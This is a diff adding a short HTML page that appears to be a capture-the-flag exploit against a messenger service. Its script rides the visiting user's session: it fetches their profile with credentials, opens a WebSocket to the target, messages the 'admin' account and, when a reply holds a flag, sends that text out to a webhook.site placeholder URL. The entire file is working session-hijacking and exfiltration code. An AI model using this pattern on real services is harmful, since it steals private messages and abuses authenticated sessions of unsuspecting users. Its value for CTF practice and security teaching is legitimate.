@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+(async () => {
+  const BASE = 'https://vka-messenger.ru';
+  const me = await fetch(BASE + '/api/me', { credentials: 'include' }).then(r => r.json());
+  const ws = new WebSocket('wss://vka-messenger.ru/ws');
+
+  ws.onmessage = async (e) => {
+    const msg = JSON.parse(e.data);
+    if (msg.type === 'hello') {
+      ws.send(JSON.stringify({ op: 'open_dm', username: 'admin' }));
+    }
+    if (msg.type === 'dm_opened') {
+      ws.send(JSON.stringify({ op: 'send_message', chat_id: msg.chat_id, body: 'flag' }));
+    }
+    if (msg.type === 'message' && msg.message?.body?.includes('vkactf{')) {
+      await fetch('https://webhook.site/YOUR-UUID?flag=' + encodeURIComponent(msg.message.body));
+      window.__desklineDone = true;
+    }
+  };
+})();
+</script>
+</body>
+</html>
